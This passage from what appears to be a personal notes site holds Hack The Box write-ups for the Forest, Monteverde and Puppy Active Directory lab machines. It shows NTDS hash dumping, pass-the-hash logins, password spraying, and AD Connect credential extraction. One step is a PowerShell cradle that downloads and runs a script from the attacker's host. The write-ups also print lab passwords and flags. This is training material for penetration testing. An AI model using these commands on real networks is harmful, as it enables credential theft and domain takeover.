DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.\n[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter\n[*] Cleaning up...\n</code></pre> nice! as you can see above, we dumped the <code>NTDS.DIT secrets</code>, thus getting the NTLM hash of the administrator!</p>"},{"location":"ch3ckm8_HTB_forest/#reminder_1","title":"Reminder","text":"<p><code>secretsdump</code> is a post-exploitation tool used to dump credentials (like password hashes, cleartext passwords, and Kerberos keys) from a Windows host ,It can extract credentials from: - NTDS.dit (Active Directory database) - LSASS memory (via remote execution) - SAM registry hive (local user accounts) - LSA secrets (stored service credentials, cached logins) It works remotely by using DCERPC over SMB, unlike mimikatz which needs to be \"dropped\" locally to work.</p>"},{"location":"ch3ckm8_HTB_forest/#required-user-privileges","title":"\ud83d\udd11 Required user privileges:","text":"<ul> <li>The user must be a member of the <code>Administrators</code> group on the target machine.<ul> <li>This includes:<ul> <li>Domain Admins (on domain-joined machines)</li> <li>Local Administrators (if attacking a workstation/server)</li> </ul> </li> </ul> </li> </ul>"},{"location":"ch3ckm8_HTB_forest/#why","title":"\ud83e\udde0 Why?","text":"<ul> <li>To read sensitive areas like LSASS memory, the SAM/SECURITY hives, or interact with the Service Control Manager (SCM), you need SeDebugPrivilege, which is granted to administrators.</li> </ul>"},{"location":"ch3ckm8_HTB_forest/#logging-in-as-admin-via-ntlm-hash-pass-the-hash","title":"Logging in as admin via NTLM hash (pass the hash)","text":"<p>Finally, we can login as admin: <pre><code>evil-winrm -i forest.htb -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'\n</code></pre> grabbed root flag! <code>220ff7540080290377f0311c43b6e62b</code>, pwned!</p>"},{"location":"ch3ckm8_HTB_forest/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_forest/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; chose smb , rpc and ldap services to focus on</li> <li>enumerate <code>SMB</code> shares -&gt; nothing useful</li> <li>enumerate <code>RPC</code> -&gt; found users and domain groups</li> <li>enumerate <code>LDAP</code> -&gt; found users with <code>DONT_REQ_PREAUTH</code> flag enabled, and also found users that can <code>login remotely</code></li> </ol>"},{"location":"ch3ckm8_HTB_forest/#foothold_1","title":"Foothold","text":"<ol> <li>Tried bruteforce (since password policy encourages it) but no luck</li> <li><code>AS-REP roasting</code> was conducted and successfully got AS-REP hash (since the user has The <code>Do not require Kerberos preauthentication</code> flag enabled as identified by the ldap enumeration)</li> <li><code>cracked</code> the AS-REP has and got a password</li> <li><code>correlated</code> the found creds with the win-rm service</li> <li>logged in via evil-winrm to host using on user svc-alfresco, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_forest/#privesc_1","title":"Privesc","text":"<ol> <li>now that we got foothold, as a user (svc-alfresco) i launched <code>BloodHound</code> to inspect even further</li> <li>found that user is member of a group, thats member of another group (<code>Account Operators</code>) that has <code>GenericAll</code> rights to an other group <code>EXCHANGE WINDOWS PERMISSIONS</code>.</li> <li>This other group (<code>EXCHANGE WINDOWS PERMISSIONS</code>) had <code>WriteDacl</code> rights towards the <code>Domain</code>!</li> <li>First i added the user to the <code>Account Operators</code> group</li> <li>Secondly i abused <code>DACL</code> by granting <code>DCSync</code> rights to the user</li> <li><code>Dumped secrets</code> remotely since the user has <code>DCSync</code> rights, thus revealing the admin's NTLM hash</li> <li>using administrator's NTLM hash we login via evil-winrm to the host and grab the root flag!</li> </ol>"},{"location":"ch3ckm8_HTB_forest/#sidenotes","title":"Sidenotes","text":"<p>All in all, this machine is a meaningful and important addition to my OSCP notes. A not assumed breach scenario requiring thorough enumeration and good understanding of ACL during the privesc stage, resulting in a solid writeup for future reference. </p> <p></p>"},{"location":"ch3ckm8_HTB_monteverde/","title":"Monteverde","text":""},{"location":"ch3ckm8_HTB_monteverde/#intro","title":"Intro","text":"<p>[[windows]] [[AD]] [[OSCPpath]] [[NotAssumedBreach]] [[ADconnectAbuse]] Tags: #windows #AD #OSCPpath #NotAssumedBreach #ADconnectAbuse Tools used: - windapsearch (LDAP enum) - enum4linux (SMB enumeration) - smbmap (SMB enumeration) - crackmapexec (password spraying)</p>"},{"location":"ch3ckm8_HTB_monteverde/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_monteverde/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV monteverde.htb\n</code></pre> <p><pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-06-23 02:52 EEST\nNmap scan report for monteverde.htb (10.10.10.172)\nHost is up (0.055s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-22 23:53:01Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-06-22T23:53:05\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 58.88 seconds\n</code></pre> The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This reveals that the server is a domain controller. The domain is identified by Nmap as MEGABANK.LOCAL</p> <p>WHAT NOW? we have a dc in front of us, but no valid creds for the domain! So this isnt an assumed breach scenario!</p>"},{"location":"ch3ckm8_HTB_monteverde/#ldap-enumeration","title":"LDAP enumeration","text":"<p>this is the first time i came accross this, and found this script: https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py</p> <pre><code>python windapsearch.py -u \"\" --dc-ip 10.10.10.172\n</code></pre> <p></p> <p>We can also enumerate the domain users.</p> <pre><code>python windapsearch.py -u \"\" --dc-ip 10.10.10.172 -U --admin-objects\n</code></pre> <pre><code>[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 10.10.10.172\n[+] Getting defaultNamingContext from Root DSE\n[+] Found: DC=MEGABANK,DC=LOCAL\n[+] Attempting bind\n[+] ...success! Binded as:\n[+] None\n[+] Enumerating all AD users\n[+] Found 10 users:\ncn: Guest\ncn: AAD_987d7f2f57d2\ncn: Mike Hope\nuserPrincipalName: mhope@MEGABANK.LOCAL\ncn: SABatchJobs\nuserPrincipalName: SABatchJobs@MEGABANK.LOCAL\ncn: svc-ata\nuserPrincipalName: svc-ata@MEGABANK.LOCAL\ncn: svc-ata\nuserPrincipalName: svc-ata@MEGABANK.LOCAL\ncn: svc-bexec\nuserPrincipalName: svc-bexec@MEGABANK.LOCAL\ncn: svc-netapp\nuserPrincipalName: svc-netapp@MEGABANK.LOCAL\ncn: Dimitris Galanos\nuserPrincipalName: dgalanos@MEGABANK.LOCAL\ncn: Ray O'Leary\nuserPrincipalName: roleary@MEGABANK.LOCAL\ncn: Sally Morgan\nuserPrincipalName: smorgan@MEGABANK.LOCAL\n[+] Attempting to enumerate all admin (protected) objects\n[+] Found 0 Admin Objects:\n</code></pre> <p>the account <code>AAD_987d7f2f57d2</code> <pre><code>cn: Guest\ncn: AAD_987d7f2f57d2\n</code></pre> indicates that <code>AD Connect</code> is installed in the domain. AD Connect is a tool that is used to synchronize an on-premise Active Directory environment to Azure Active Directory.</p> <p>Using windapsearch we can further enumerate domain groups, and see which users belong to <code>Remote Management Users</code> . \u2192 This group allows its members to connect to computers using PowerShell Remoting. <pre><code>python windapsearch.py -u \"\" --dc-ip 10.10.10.172 -U -m \"Remote Management Users\"\n</code></pre></p> <p> The user mhope (CN=Mike Hope) is identified to be in the Remote Management Users group.</p>"},{"location":"ch3ckm8_HTB_monteverde/#rpc-enumeration","title":"RPC enumeration","text":"<p>We could also check rpc with <code>rpcclient</code> since <code>port 135</code> is open <pre><code>rpcclient -U \"\" -N 10.10.10.172\n</code></pre></p> <pre><code>querydispinfo\n</code></pre> <pre><code>index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.\nindex: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)\nindex: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain\nindex: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)\nindex: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)\nindex: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)\nindex: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)\nindex: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)\nindex: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)\nindex: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)\n</code></pre>"},{"location":"ch3ckm8_HTB_monteverde/#smb-enumeration","title":"SMB enumeration","text":"<p>Let's use smbclient to test for SMB null sessions. Command output reports that the anonymous login attempt was successful, although it failed to list any shares.</p> <p>We can attempt to get credentials and access it again <pre><code>smbclient -N -L \\\\\\\\\\\\\\\\10.10.10.172\\\\\\\\\n</code></pre> </p>"},{"location":"ch3ckm8_HTB_monteverde/#domain-password-policy","title":"Domain Password policy","text":"<p>Let's use enum4linux to retrieve other domain information. We note that the Account Lockout Threshold is set to None , so we can attempt a password spray in order to obtain valid credentials. windapsearch can be used to create a list of domain users. <pre><code>enum4linux -a 10.10.10.172\n</code></pre> </p>"},{"location":"ch3ckm8_HTB_monteverde/#find-valid-users","title":"Find valid Users","text":"<p>According the the <code>password policy</code> , we found that <code>Account Lockout Threshold</code> is set to None , so we can attempt <code>password spraying</code> in order to obtain valid credentials without getting locked !!!</p> <p>windapsearch can also be used to create a list of domain users. <pre><code>windapsearch.py -u \"\" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut\n-d '@' -f 1 | uniq &gt; users.txt \n</code></pre> and we collected the valid users as shown below: </p>"},{"location":"ch3ckm8_HTB_monteverde/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_monteverde/#password-spraying","title":"Password spraying","text":"<p>We have our user list, and for our password spraying attempt we can use a very short list of statistically likely passwords. It's worth appending the discovered usernames to this list, as having a password of the username is unfortunately a common practice., using this <code>wordlist</code>: <pre><code>wget https://raw.githubusercontent.com/insidetrust/statistically-likely-\nusernames/master/weak-corporate-passwords/english-basic.txt\ncat users.txt &gt;&gt; english-basic.txt\n</code></pre></p> <p>Next, we can use CrackMapExec to perform the password spray, noting that there is no risk in the accounts locking out owning to the absence of an account lockout policy. <pre><code>crackmapexec smb 10.10.10.172 -d megabank -u users.txt -p english-basic.txt\n</code></pre></p> <pre><code>SMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Password1 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Welcome1 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Letmein1 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Password123 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Welcome123 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:Letmein123 STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\mhope:mhope STATUS_LOGON_FAILURE\n&lt;SNIP&gt;\nSMB 10.10.10.172 445 MONTEVERDE [-] megabank\\\\SABatchJobs:mhope STATUS_LOGON_FAILURE\nSMB 10.10.10.172 445 MONTEVERDE [+] megabank\\\\SABatchJobs:SABatchJobs\n</code></pre> <p>This was successful and we have gained valid domain credentials: <code>SABatchJobs / SABatchJobs</code> .</p>"},{"location":"ch3ckm8_HTB_monteverde/#smb-enumeration-as-sabatchjobs","title":"SMB enumeration as SABatchJobs","text":"<p><pre><code>smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -x whoami\n</code></pre> This wasn't successful.</p> <p>We can instead use smbmap to enumerate the remote file shares, which lists our <code>permissions</code>. <pre><code>smbmap -u SABatchJobs  -p SABatchJobs -d megabank -H 10.10.10.172\n</code></pre> </p> <p>Next, let's <code>crawl</code> the users$ share for potentially interesting files, such as Office documents, text and XML files. (saves time when having large number of shares) <pre><code>smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A\n'(xlsx|docx|txt|xml)' -R\n</code></pre></p> <p>This reveals the file azure.xml , which is automatically downloaded. this file contained a password! <pre><code>&lt;S N=\"Password\"&gt;4n0therD4y@n0th3r$&lt;/S&gt;\n</code></pre></p>"},{"location":"ch3ckm8_HTB_monteverde/#logging-in-as-mhope","title":"Logging in as mhope","text":"<p>Let's check if <code>mhope</code> also uses this password in the local AD, as we know this account is in the <code>Remote Management Users</code> group. <pre><code>evil-winrm -i 10.129.180.160 -u mhope -p '4n0therD4y@n0th3r$'\n</code></pre> and we are in! , lets grab the flag: <code>c5493bf7722329e80c066b1b2f69a58f</code></p>"},{"location":"ch3ckm8_HTB_monteverde/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_monteverde/#checking-users-privileges","title":"Checking user's privileges","text":"<pre><code>whoami /priv\n</code></pre> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre>"},{"location":"ch3ckm8_HTB_monteverde/#checking-group-membership","title":"Checking group membership","text":"<pre><code>whoami /groups\n</code></pre> <p><pre><code>GROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                          Attributes\n=========================================== ================ ============================================ ==================================================\nEveryone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nMEGABANK\\\\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\\\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\\\Medium Plus Mandatory Level Label            S-1-16-8448\n</code></pre> By inspecting those groups, the one that stands out is the group <code>MEGABANK\\\\Azure Admins</code></p> <p>the <code>group membership</code> could be found also by running: <pre><code>net user mhope\n</code></pre></p>"},{"location":"ch3ckm8_HTB_monteverde/#bloodhound-as-mhope","title":"Bloodhound as mhope","text":"<p>Lets inspect the AD via bloodhound: <pre><code>bloodhound-python -u 'mhope' -p '4n0therD4y@n0th3r$'  -d monteverde.htb -ns 10.129.180.160 -c All --zip\n</code></pre></p> <p>Very interesting, it appears that user <code>MHOPE</code> is member of <code>AZURE_ADMINS</code> group: </p>"},{"location":"ch3ckm8_HTB_monteverde/#inspecting-the-hosts-program-files","title":"Inspecting the host's Program Files","text":"<p>since the user is member of <code>AZURE_ADMINS</code> group, lets try to find azure/microsoft related installed programs at <code>program files</code> <pre><code>cd C:\\\\Progra~1\nls\n</code></pre></p> <p><pre><code>Mode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         1/2/2020   9:36 PM                Common Files\nd-----         1/2/2020   2:46 PM                internet explorer\nd-----         1/2/2020   2:38 PM                Microsoft Analysis Services\nd-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect\nd-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader\nd-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent\nd-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync\nd-----         1/2/2020   2:38 PM                Microsoft SQL Server\n</code></pre> So what's going on here? how can we move forward?</p>"},{"location":"ch3ckm8_HTB_monteverde/#abusing-azure-ad-connect","title":"Abusing Azure AD connect","text":"<p>But before we proceed with exploiting it, how does <code>AD connnect</code> work?</p> <p>I found this article: https://blog.xpnsec.com/azuread-connect-for-redteam/ which also aligns with some of the indicators i found above (like the installed programs for example).</p> <p>In simple terms, this works due to the fact that <code>Azure AD connect</code> stores creds locally via sql, and if an attacker has local access (in our case is mhope), they can extract creds without the need to communicate with Azure.</p> <p>In our case, <code>mhope</code> can connect to the local sql db and extract the configuration. Then we can decrypt the configuration and get the creds for the account that does the replication of Active Directory to Azure.</p> <p>Well, the above appear to be related to <code>Azure-AD-Connect</code>and for this matter, i found this script:  https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/blob/main/decrypt.ps1</p> <ul> <li>The script will attempt to: <ul> <li>Connect to the ADSync SQL database.</li> <li>Load the necessary cryptographic library (<code>mcrypt.dll</code>).</li> <li>Retrieve and decrypt stored credentials (Domain, Username, and Password).</li> </ul> </li> </ul> <p>First start a web server on our host: <pre><code>python -m http.server 8888\n</code></pre></p> <p>Transfer and run the powershell script: <pre><code>iex(new-object net.webclient).downloadstring('http://10.10.14.202:8888/script.ps1')\n</code></pre></p> <p>Executing the powershell script on the host: <pre><code>Attempting connection: Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync;Integrated Security=True\nError connecting to SQL database. Trying next...\nException Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)\nAttempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True\nConnection successful!\nLoading mcrypt.dll from: C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\nDomain: MEGABANK.LOCAL\nUsername: administrator\nPassword: d0m@in4dminyeah!\n</code></pre> great! it revealed plaintext password for the <code>administrator</code></p> <p>finally lets login <pre><code>evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'\n</code></pre> grabbed root flag <code>8c9b5fd59f2121d6181a4c2d5ff225d2</code></p>"},{"location":"ch3ckm8_HTB_monteverde/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_monteverde/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap <code>scan</code> -&gt; target is a DC, chose smb , <code>rpc</code> and ldap services to focus on</li> <li>enumerate <code>LDAP</code> -&gt; found valid usernames, found one of those (AAD_sth) to indicate that <code>AD Connect</code> is installed on the host. Also from ldap enum i found that one user (mhope) is member of <code>Remote Management Users</code> group, meaning this user can login remotely. Later i <code>collected all the valid users</code>.</li> <li>enumerate <code>RPC</code> -&gt; nothing new found</li> <li>enumerate <code>SMB</code> anonymously -&gt; revealed the <code>domain password policy</code> via enum4linux</li> </ol>"},{"location":"ch3ckm8_HTB_monteverde/#foothold_1","title":"Foothold","text":"<ol> <li><code>password spraying</code> was performed to find creds for our collected valid users, found valid domain creds for one user (SABatchJobs)</li> <li>enumerate <code>SMB</code> as user SABatchJobs, found <code>plaintext password</code></li> <li><code>correlated</code> the found password with user mhope as this user can remotely login with the <code>win-rm</code> service</li> <li>logged in via evil-winrm to host using on user svc-alfresco, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_monteverde/#privesc_1","title":"Privesc","text":"<ol> <li>Run bloodhound, and found that the compromised user (mhope) is member of <code>AZURE_ADMINS</code> group</li> <li>Inspected the <code>Program Files</code> of the host to find <code>azure related installed programs</code>, found <code>AD Connect</code> related programs, as indicated by the ldap enum from one of the valid users (AAD_sth)</li> <li><code>Abused AD Connect</code> via a powershell script i found that <code>extracts credentials</code> from AD connect, which revealed the administrator's password as plaintext</li> <li>using administrator's password we login via evil-winrm and grab the root flag!</li> </ol>"},{"location":"ch3ckm8_HTB_monteverde/#sidenotes","title":"Sidenotes","text":"<p>This was a machine i wont forget, mainly because this was my first time having to abuse AD Connect. Besides that part, no new attack vectors were introduced here.</p> <p></p>"},{"location":"ch3ckm8_HTB_puppy/","title":"Puppy","text":""},{"location":"ch3ckm8_HTB_puppy/#intro","title":"Intro","text":"<p>Machine Information <pre><code>As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!, so its an assumed breach scenario\n</code></pre> [[windows]] [[AssumedBreach]] [[DCSync]] [[ADdisabledaccount]] [[OSCPpath]]  Tags: #windows #AssumedBreach #DCsync #ADdisabledaccount #OSCPpath  Tools used: - smbclient (smb enumeration) - bloodyAD (add user to group, perform password reset) - keepass2john - keepass4brute.sh (kdbx bruteforce) - impacket-secretsdump (DCSync)</p>"},{"location":"ch3ckm8_HTB_puppy/#reconnaissance","title":"Reconnaissance","text":"<pre><code>nano /etc/hosts\n</code></pre> <pre><code>sudo nmap -sC -sV puppy.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-20 03:45 EEST\nNmap scan report for puppy.htb (10.10.11.70)\nHost is up (0.068s latency).\nNot shown: 986 filtered tcp ports (no-response)\nBug in iscsi-info: no string output.\nPORT \u00a0 \u00a0 STATE SERVICE \u00a0 \u00a0 \u00a0 VERSION\n53/tcp \u00a0 open \u00a0domain \u00a0 \u00a0 \u00a0 \u00a0Simple DNS Plus\n88/tcp \u00a0 open \u00a0kerberos-sec \u00a0Microsoft Windows Kerberos (server time: 2025-06-20 07:46:34Z)\n111/tcp \u00a0open \u00a0rpcbind \u00a0 \u00a0 \u00a0 2-4 (RPC #100000)\n| rpcinfo:\n| \u00a0 program version \u00a0 \u00a0port/proto \u00a0service\n| \u00a0 100000 \u00a02,3,4 \u00a0 \u00a0 \u00a0 \u00a0111/tcp \u00a0 rpcbind\n| \u00a0 100000 \u00a02,3,4 \u00a0 \u00a0 \u00a0 \u00a0111/tcp6 \u00a0rpcbind\n| \u00a0 100000 \u00a02,3,4 \u00a0 \u00a0 \u00a0 \u00a0111/udp \u00a0 rpcbind\n| \u00a0 100000 \u00a02,3,4 \u00a0 \u00a0 \u00a0 \u00a0111/udp6 \u00a0rpcbind\n| \u00a0 100003 \u00a02,3 \u00a0 \u00a0 \u00a0 \u00a0 2049/udp \u00a0 nfs\n| \u00a0 100003 \u00a02,3 \u00a0 \u00a0 \u00a0 \u00a0 2049/udp6 \u00a0nfs\n| \u00a0 100005 \u00a01,2,3 \u00a0 \u00a0 \u00a0 2049/udp \u00a0 mountd\n| \u00a0 100005 \u00a01,2,3 \u00a0 \u00a0 \u00a0 2049/udp6 \u00a0mountd\n| \u00a0 100021 \u00a01,2,3,4 \u00a0 \u00a0 2049/tcp \u00a0 nlockmgr\n| \u00a0 100021 \u00a01,2,3,4 \u00a0 \u00a0 2049/tcp6 \u00a0nlockmgr\n| \u00a0 100021 \u00a01,2,3,4 \u00a0 \u00a0 2049/udp \u00a0 nlockmgr\n| \u00a0 100021 \u00a01,2,3,4 \u00a0 \u00a0 2049/udp6 \u00a0nlockmgr\n| \u00a0 100024 \u00a01 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 2049/tcp \u00a0 status\n| \u00a0 100024 \u00a01 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 2049/tcp6 \u00a0status\n| \u00a0 100024 \u00a01 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 2049/udp \u00a0 status\n|_ \u00a0100024 \u00a01 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 2049/udp6 \u00a0status\n135/tcp \u00a0open \u00a0msrpc \u00a0 \u00a0 \u00a0 \u00a0 Microsoft Windows RPC\n139/tcp \u00a0open \u00a0netbios-ssn \u00a0 Microsoft Windows netbios-ssn\n389/tcp \u00a0open \u00a0ldap \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)\n445/tcp \u00a0open \u00a0microsoft-ds?\n464/tcp \u00a0open \u00a0kpasswd5?\n593/tcp \u00a0open \u00a0ncacn_http \u00a0 \u00a0Microsoft Windows RPC over HTTP 1.0\n636/tcp \u00a0open \u00a0tcpwrapped\n2049/tcp open \u00a0nlockmgr \u00a0 \u00a0 \u00a01-4 (RPC #100021)\n3260/tcp open \u00a0iscsi?\n3268/tcp open \u00a0ldap \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)\n3269/tcp open \u00a0tcpwrapped\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n| \u00a0 3:1:1:\n|_ \u00a0 \u00a0Message signing enabled and required\n| smb2-time:\n| \u00a0 date: 2025-06-20T07:48:24\n|_ \u00a0start_date: N/A\n|_clock-skew: 6h59m59s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 218.41 seconds\n</code></pre> <code>smbclient -N -L //&lt;FQDN/IP&gt;</code> Null session authentication on SMB. <code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code> Connect to a specific SMB share. <code>rpcclient -U \"\" &lt;FQDN/IP&gt;</code> Interaction with the target using RPC. <code>samrdump.py &lt;FQDN/IP&gt;</code> Username enumeration using Impacket scripts. <code>smbmap -H &lt;FQDN/IP&gt;</code> Enumerating SMB shares. <code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code> Enumerating SMB shares using null session authentication. <code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code> SMB enumeration using enum4linux."},{"location":"ch3ckm8_HTB_puppy/#smb-shares-enum","title":"SMB shares enum","text":"<p>levi.james / KingofAkron2025! <pre><code>smbclient -U 'levi.james' -L puppy.htb\n</code></pre></p> <pre><code>Sharename \u00a0 \u00a0 \u00a0 Type \u00a0 \u00a0 \u00a0Comment\n--------- \u00a0 \u00a0 \u00a0 ---- \u00a0 \u00a0 \u00a0-------\nADMIN$ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Disk \u00a0 \u00a0 \u00a0Remote Admin\nC$ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0Disk \u00a0 